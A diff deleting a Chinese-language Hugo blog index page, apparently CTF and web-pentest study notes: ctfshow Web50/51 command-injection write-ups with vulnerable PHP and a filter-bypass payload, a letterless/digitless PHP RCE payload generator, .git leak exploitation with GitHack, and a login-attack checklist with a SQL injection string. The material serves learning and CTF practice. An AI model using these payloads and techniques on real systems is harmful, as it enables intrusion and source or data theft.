@@ -1,401 +1,0 @@
-<!DOCTYPE html>
-<html lang="en" dir="auto">
-
-<head>
-	<meta name="generator" content="Hugo 0.148.1"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
-<title>My New Hugo Site</title>
-
-<meta name="description" content="">
-<meta name="author" content="">
-<link rel="canonical" href="http://localhost:1313/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css" integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
-<meta name="theme-color" content="#2e2e33">
-<meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" type="application/rss+xml" href="http://localhost:1313/index.xml">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/">
-<noscript>
-    <style>
-        #theme-toggle,
-        .top-link {
-            display: none;
-        }
-
-    </style>
-    <style>
-        @media (prefers-color-scheme: dark) {
-            :root {
-                --theme: rgb(29, 30, 32);
-                --entry: rgb(46, 46, 51);
-                --primary: rgb(218, 218, 219);
-                --secondary: rgb(155, 156, 157);
-                --tertiary: rgb(65, 66, 68);
-                --content: rgb(196, 196, 197);
-                --code-block-bg: rgb(46, 46, 51);
-                --code-bg: rgb(55, 56, 62);
-                --border: rgb(51, 51, 51);
-            }
-
-            .list {
-                background: var(--theme);
-            }
-
-            .list:not(.dark)::-webkit-scrollbar-track {
-                background: 0 0;
-            }
-
-            .list:not(.dark)::-webkit-scrollbar-thumb {
-                border-color: var(--theme);
-            }
-        }
-
-    </style>
-</noscript>
-</head>
-
-<body class="list" id="top">
-<script>
-    if (localStorage.getItem("pref-theme") === "dark") {
-        document.body.classList.add('dark');
-    } else if (localStorage.getItem("pref-theme") === "light") {
-        document.body.classList.remove('dark')
-    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
-        document.body.classList.add('dark');
-    }
-
-</script>
-
-<header class="header">
-    <nav class="nav">
-        <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="My New Hugo Site (Alt + H)">My New Hugo Site</a>
-            <div class="logo-switches">
-                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
-                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
-                    </svg>
-                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <circle cx="12" cy="12" r="5"></circle>
-                        <line x1="12" y1="1" x2="12" y2="3"></line>
-                        <line x1="12" y1="21" x2="12" y2="23"></line>
-                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
-                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
-                        <line x1="1" y1="12" x2="3" y2="12"></line>
-                        <line x1="21" y1="12" x2="23" y2="12"></line>
-                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
-                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
-                    </svg>
-                </button>
-            </div>
-        </div>
-        <ul id="menu">
-        </ul>
-    </nav>
-</header>
-<main class="main"> 
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">Web50
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>
-[!ImPORTANT]
-preg_match过滤绕过及RCE重定向截断
-0x01 访问靶场，回显源码
-&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 22:32:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#39;c&#39;])){$c=$_GET[&#39;c&#39;];if(!preg_match(&#34;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&#34;, $c)){system($c.&#34; &gt;/dev/null 2&gt;&amp;1&#34;);}}else{highlight_file(__FILE__);} 0x02 [!NOte]
-审计源码
-过滤字段新增x09,x26即Tab,&amp;的16进制形式
-标准输出重定向
-故构造payload时候需要采用&lt;替换空格，%0a换行替代封号
-构造payload如下
-?c=tac%3Cfla%3F.php%0a 0x03 目录搜寻过程不再赘述
-提交payload获得flag
-</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-03-10 00:00:00 +0000 UTC'>March 10, 2025</span>&nbsp;·&nbsp;AuranLu</footer>
-  <a class="entry-link" aria-label="post link to Web50" href="http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web50/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">Web51
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>
-[!Important]
-preg_match过滤绕过及RCE重定向截断
-0x01 访问靶场，获得源码
-&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 22:42:52# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#39;c&#39;])){$c=$_GET[&#39;c&#39;];if(!preg_match(&#34;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&#34;, $c)){system($c.&#34; &gt;/dev/null 2&gt;&amp;1&#34;);}}else{highlight_file(__FILE__);} 0x02 [!Note]
-审计源码
-preg_match过滤字段新增tac
-标准输出重定向
-构造payload思路为使用nl替换tac并截断重定向
-0x03 目录扫描过程不再赘述，提交payload查看源码获得flag
-</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-03-10 00:00:00 +0000 UTC'>March 10, 2025</span>&nbsp;·&nbsp;AuranLu</footer>
-  <a class="entry-link" aria-label="post link to Web51" href="http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web51/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">常用字符替换
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p> ；封号
-&amp;&amp;： 在PHP中&amp;&amp;代表执行两个命令，让后面的命令进入黑洞。 在shell及bash脚本中&amp;&amp;（逻辑与）：只有前一个命令成功（返回值 0）时，后一个命令才会执行。如果前一个命令永远不会失败（如 echo），则 &amp;&amp; 和 ; 看起来就像是等价的 %0a即\n换行 Space空格
-Tab：
-Tab（制表符）在 ASCII 码中是 \t（十进制 9）。Space（空格）在 ASCII 码中是 \x20（十进制 32）。
-在许多编辑器（如 VSCode、IDEA）或 expand 命令下，Tab 可以被自动转换为多个 Space（一般是 4 个或 8 个）。例如，Python PEP 8 规范推荐用 4 个 Space 代替 Tab。
-在 Shell 命令行中，多个空白字符（包括 Tab 和 Space）通常会被解析为相同的分隔符。
-在 Makefile 里，缩进 必须是 Tab，不能用 Space。
-$IFS：
-$IFS代表shell里面的空格 &lt;
-&#43;
-%20
-cat
-more
-less
-sort
-tail
-head
-sed
-cut
-awk
-strings
-od
-curl
-tac
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-03-10 00:00:00 +0000 UTC'>March 10, 2025</span>&nbsp;·&nbsp;AuranLu</footer>
-  <a class="entry-link" aria-label="post link to 常用字符替换" href="http://localhost:1313/posts/auran_lu/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/%E5%B8%B8%E7%94%A8%E5%AD%97%E7%AC%A6%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%85%B6%E6%9B%BF%E6%8D%A2/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">常见前端语言和数据库搭配
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>数据库：Oracle 大型数据库、Access、SQL Server（ms SQL）、MySQL 常用中小型数据库 中间件：IIS、Apache、Nginx、Tomcat 脚本：PHP、ASP、ASPX（ASP.NET）、JSP
-脚本和数据库的搭配： PHP &#43; MySQL ASP &#43; Access 、ASP &#43; SQL Server（ms SQL） ASPX（ASP.NET）&#43; SQL Server（ms SQL） JSP &#43; MySQL 、JSP &#43; Oracle
-综合搭配： Linux &#43; Apache &#43; PHP &#43; MySQL Linux &#43; Nginx &#43; PHP &#43; MySQL Windows &#43; IIS &#43; ASPX（ASP.NET）&#43; SQL Server（ms SQL） Linux &#43; Tomcatt &#43; JSP &#43; MySQL Linux &#43; Tomcat &#43; JSP &#43; Oracle
-常见脚本语言及其后缀名格式
-ASP：.asp
-ASPX：.aspx
-JAVASCRIPT：.js
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-03-10 00:00:00 +0000 UTC'>March 10, 2025</span>&nbsp;·&nbsp;AuranLu</footer>
-  <a class="entry-link" aria-label="post link to 常见前端语言和数据库搭配" href="http://localhost:1313/posts/auran_lu/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/%E5%B8%B8%E8%A7%81%E5%89%8D%E7%AB%AF%E8%AF%AD%E8%A8%80%E5%92%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E6%90%AD%E9%85%8D/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">技术文档配置文件公告文件_robots.txt_
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>一、robots.txt **概念：**robots.txt是网站管理者写给爬虫的一封信，里面描述了网站管理者不希望爬虫做的事，比如：不要访问某个文件、文件夹，禁止某些爬虫的访问，限制爬虫访问网站的频率
-**内容：**User-agent: 爬虫的名称
-Disallow: 不允许爬虫访问的地址
-Allow: 允许爬虫访问的地址
-若User-agent是*，则表示对象是所有爬虫。
-Disallow和Allow后面跟的是地址，地址的描述格式符合正则表达式(regex)的规则。因此可以在python中使用正则表达式来筛选出可以访问的地址。
-二、常见技术文档 1.通用文档格式 .pdf
-Portable Document Format（便携式文档格式），由Adobe开发，跨平台且保留排版，适合打印和共享。
-特点：不可编辑（除非使用专业工具）、高兼容性。
-.doc / .docx
-Microsoft Word 文档格式，广泛用于编辑和协作，支持复杂排版。
-适用场景：初稿撰写、团队审阅（需搭配Office工具）。
-.odt
-Open Document Text，开源格式（如LibreOffice），兼容性较好，适合替代Word。
-2.纯文本与标记语言 .md / .markdown
-Markdown 格式，轻量级标记语言，易读易写，支持代码块和基础排版。
-用途：README文件、GitHub文档、静态网站生成（如GitBook、Hugo）。
-.rst
-reStructuredText，比Markdown更结构化，常用于Python项目的Sphinx文档生成。
-.tex
-LaTeX 文件，学术论文和技术文档的标准格式，支持复杂公式和排版。
-.adoc
-AsciiDoc，类似Markdown但功能更丰富，支持导出为PDF/HTML等格式。
-3.在线与协作工具 .html
-网页格式，适合在线发布技术文档（搭配CSS/JavaScript增强交互性）。
-.xml / .dita
-XML 用于结构化数据存储，DITA（Darwin Information Typing Architecture）专为技术文档设计，支持模块化内容管理。
-.yaml / .yml
-配置文件格式，常见于API文档、系统配置（如Swagger API规范）。
-4.版本控制与开发相关 无后缀（如README）
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-03-10 00:00:00 +0000 UTC'>March 10, 2025</span>&nbsp;·&nbsp;AuranLu</footer>
-  <a class="entry-link" aria-label="post link to 技术文档配置文件公告文件_robots.txt_" href="http://localhost:1313/posts/auran_lu/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%85%AC%E5%91%8A%E6%96%87%E4%BB%B6_robots.txt_/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">无数字字母rce
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p> [!Important]
-无数字字母RCE核心思路：利用各种非数字字母的字符，经过各种变换（异或、取反、自增），构造出单个的字母字符，然后把单个字符拼接成一个函数名并动态执行
-[!Note]
-综合脚本
-&lt;?php/*# -*- coding: utf-8 -*-# @Author: Y4tacker# @Date: 2020-11-21 20:31:22*///或function orRce($par1, $par2){$result = (urldecode($par1)|urldecode($par2));return $result;}//异或function xorRce($par1, $par2){$result = (urldecode($par1)^urldecode($par2));return $result;}//取反function negateRce(){fwrite(STDOUT,&#39;[&#43;]your function: &#39;);$system=str_replace(array(&#34;\r\n&#34;, &#34;\r&#34;, &#34;\n&#34;), &#34;&#34;, fgets(STDIN));fwrite(STDOUT,&#39;[&#43;]your command: &#39;);$command=str_replace(array(&#34;\r\n&#34;, &#34;\r&#34;, &#34;\n&#34;), &#34;&#34;, fgets(STDIN));echo &#39;[*] (~&#39;.urlencode(~$system).&#39;)(~&#39;.urlencode(~$command).&#39;);&#39;;}//mode=1代表或，2代表异或，3代表取反//取反的话，就没必要生成字符去跑了，因为本来就是不可见字符，直接绕过正则表达式function generate($mode, $preg=&#39;/[0-9]/i&#39;){if ($mode!=3){$myfile = fopen(&#34;rce.txt&#34;, &#34;w&#34;);$contents = &#34;&#34;;for ($i=0;$i&lt;256;$i&#43;&#43;){for ($j=0;$j&lt;256;$j&#43;&#43;){if ($i&lt;16){$hex_i = &#39;0&#39;.dechex($i);}else{$hex_i = dechex($i);}if ($j&lt;16){$hex_j = &#39;0&#39;.dechex($j);}else{$hex_j = dechex($j);}if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){echo &#34;&#34;;}else{$par1 = &#34;%&#34;.$hex_i;$par2 = &#39;%&#39;.$hex_j;$res = &#39;&#39;;if ($mode==1){$res = orRce($par1, $par2);}else if ($mode==2){$res = xorRce($par1, $par2);}if (ord($res)&gt;=32&amp;ord($res)&lt;=126){$contents=$contents.$res.&#34; &#34;.$par1.&#34; &#34;.$par2.&#34;\n&#34;;}}}}fwrite($myfile,$contents);fclose($myfile);}else{negateRce();}}generate(1,&#39;/[0-9]|[a-z]|\^|\&#43;|\~|\$|\[|\]|\{|\}|\&amp;|\-/i&#39;);//1代表模式，后面的是过滤规则 一.异或^ php按位异或原理：在php中，两个字符进行异或操作后，得到的依然是一个字符，两个字符进行异或时，会先将字符串转换成ascii码值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：1^1=0,1^0=1,0^1=1,0^0=0
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-03-10 00:00:00 +0000 UTC'>March 10, 2025</span>&nbsp;·&nbsp;AuranLu</footer>
-  <a class="entry-link" aria-label="post link to 无数字字母rce" href="http://localhost:1313/posts/auran_lu/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">测试探针泄露_php探针
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>原理 PHP探针实际上是一种Web脚本程序，主要是用来探测虚拟空间、服务器的运行状况，而本质上是通过PHP语言实现探测PHP服务器敏感信息的脚本文件，通常用于探测网站目录、服务器操作系统、PHP版本、数据库版本、CPU、内存、组件支持等，基本能够很全面的了解服务器的各项信息。
-常见的PHP探针有：
-雅黑php探针：一般用于linux系统，目前不支持PHP7以上版本。 X探针：（又名刘海探针）是一款由 INN STUDIO 原创主导开发的开源 PHP 探针，支持PHP5.3&#43;以上。 UPUPW php探针：安全性较高，可以防探针泄露，一般用于window系统。 利用 探针的文件常见命名为tz.php，在tz.php中可直接访问phpinfo.php
-</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-03-10 00:00:00 +0000 UTC'>March 10, 2025</span>&nbsp;·&nbsp;AuranLu</footer>
-  <a class="entry-link" aria-label="post link to 测试探针泄露_php探针" href="http://localhost:1313/posts/auran_lu/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/%E6%B5%8B%E8%AF%95%E6%8E%A2%E9%92%88%E6%B3%84%E9%9C%B2_php%E6%8E%A2%E9%92%88/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">生产环境源码泄露_git泄露svn泄露vim缓存泄露
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>原理 Git是一个开源的分布式版本控制系统，在执行git init初始化目录的时候，会在当前目录下自动创建一个.git目录，用来记录代码的变更记录等。发布代码的时候，如果没有把.git这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码，这就引起了git泄露漏洞。 SVN（subversion）是一个开放源代码的版本控制系统，通过采用分支管理系统的高效管理，简而言之就用用于多个人共同开发同一个项目，实现的共享资源，实现最终集中式的管理。在使用 SVN 管理本地代码过程中，使用 svn checkout 功能来更新代码时，项目目录下会自动生成隐藏的.svn文件夹，其中包含重要的源代码信息 vim在编辑文档的过程中如果异常退出，会产生缓存文件，第一次产生的缓存文件后缀为.swp，后面会产生.swo 工具 scrabble，dirsearch，gihack
-利用 一、git泄露 1.常规git泄露： 即没有任何其他操作，可直接访问到.git目录或通过运用工具即可获取网站源码或者 flag。可以使用scrabble工具（不要忘了需要先进入scrabble所在目录）查看网站源码。
-/scrabble url
-2.git回滚 git 作为一个版本控制工具，会记录每次提交(commit)的修改，所以当题目存在泄露时，flag(敏感)文件可能在修改中被删除或被覆盖了，这时我们可以利用 git 的git reset恢复到以前的版本。
-我们先利用 scrabble 工具获取源码，再通过“git reset –hard HEAD^”命令跳到上一个版本，（HEAD^是指上一个版本名)，即可获取到源码。
-除了使用“git reset”，更简单的方式是通过“git log-stat”命令查看每个 commit 修改了哪些文件，再用“git diff commit-id1 commit-id2”比较在当前版本与想査看的 commit 之间的变化。
-3.git分支 在每次提交时，git 都会自动把它们串成一条时间线，这条时间线就是一个分支。而git允许使用多个分支，从而让用户可以把工作从开发主线上分离出来，以免影响开发主线。如果没有新建分支，那么只有一条时间线，即只有一个分支，git 中默认为master分支。因此，我们要找的 fag 或敏感文件可能不会藏在当前分支中，这时使用“git log”命令只能找到在当前分支上的修改，并不能看到我们想要的信息，因此需要切换分支来找到想要的文件现在大多数现成的 git 泄露工具都不支持分支，如果需要还原其他分支的代码，往往要手工进行文件的提取，这里就需要用到GitHack工具了。
-GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，还原重建工程源代码。
-虚拟机安装的GitHack需要用到Python2的版本，而且需要先进入GitHack目录下，否则找不到GitHack.py文件。
-python2 GitHack.py -u url(此时的url末尾不要忘记/.git)
-扫描完成后会在GitHack文件夹下生成一个dist文件夹，
-1.使用dirsearch工具对网站进行扫描。
-dirsearch -u url -e*
-扫描后若发现存在Git漏洞，则可以进行第二步。
-2.GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，还原重建工程源代码。
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-03-10 00:00:00 +0000 UTC'>March 10, 2025</span>&nbsp;·&nbsp;AuranLu</footer>
-  <a class="entry-link" aria-label="post link to 生产环境源码泄露_git泄露svn泄露vim缓存泄露" href="http://localhost:1313/posts/auran_lu/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2_git%E6%B3%84%E9%9C%B2svn%E6%B3%84%E9%9C%B2vim%E7%BC%93%E5%AD%98%E6%B3%84%E9%9C%B2/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">登录框漏洞思路
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>登录框漏洞挖掘思路 弱口令漏洞 密码可爆破 有验证码 失效的验证码技术 验证码识别技术 无验证码 用户遍历 sql——万能密码:‘1’ or 1=1 # xss 短信 越权漏洞 </p>
-  </div>
-  <footer class="entry-footer"><span title='2025-03-10 00:00:00 +0000 UTC'>March 10, 2025</span>&nbsp;·&nbsp;AuranLu</footer>
-  <a class="entry-link" aria-label="post link to 登录框漏洞思路" href="http://localhost:1313/posts/auran_lu/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/%E7%99%BB%E5%BD%95%E6%A1%86%E6%BC%8F%E6%B4%9E%E6%80%9D%E8%B7%AF/"></a>
-</article>
-<footer class="page-footer">
-  <nav class="pagination">
-    <a class="prev" href="http://localhost:1313/page/8/">
-      «&nbsp;Prev&nbsp;
-    </a>
-  </nav>
-</footer>
-    </main>
-    
-<footer class="footer">
-        <span>&copy; 2025 <a href="http://localhost:1313/">My New Hugo Site</a></span> · 
-
-    <span>
-        Powered by
-        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
-        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
-    </span>
-</footer>
-<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
-        <path d="M12 6H0l6-6z" />
-    </svg>
-</a>
-
-<script>
-    let menu = document.getElementById('menu')
-    if (menu) {
-        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
-        menu.onscroll = function () {
-            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
-        }
-    }
-
-    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-        anchor.addEventListener("click", function (e) {
-            e.preventDefault();
-            var id = this.getAttribute("href").substr(1);
-            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
-                    behavior: "smooth"
-                });
-            } else {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
-            }
-            if (id === "top") {
-                history.replaceState(null, null, " ");
-            } else {
-                history.pushState(null, null, `#${id}`);
-            }
-        });
-    });
-
-</script>
-<script>
-    var mybutton = document.getElementById("top-link");
-    window.onscroll = function () {
-        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
-            mybutton.style.visibility = "visible";
-            mybutton.style.opacity = "1";
-        } else {
-            mybutton.style.visibility = "hidden";
-            mybutton.style.opacity = "0";
-        }
-    };
-
-</script>
-<script>
-    document.getElementById("theme-toggle").addEventListener("click", () => {
-        if (document.body.className.includes("dark")) {
-            document.body.classList.remove('dark');
-            localStorage.setItem("pref-theme", 'light');
-        } else {
-            document.body.classList.add('dark');
-            localStorage.setItem("pref-theme", 'dark');
-        }
-    })
-
-</script>
-</body>
-
-</html>
